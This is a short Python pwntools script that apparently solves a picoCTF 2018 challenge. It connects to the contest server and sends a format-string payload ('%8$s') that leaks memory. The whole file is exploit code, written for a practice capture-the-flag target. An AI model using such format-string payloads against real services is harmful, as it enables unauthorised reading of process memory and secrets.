#! /usr/bin/env python

from pwn import *

context.log_level = 'critical'

host, port = '2018shell.picoctf.com', 3981

# see other files for notes...

s = remote(host,port)

s.recvuntil('> ')
sendstring = '%8$s'
s.sendline(sendstring)
response = s.recv()

print response.strip()
s.close()
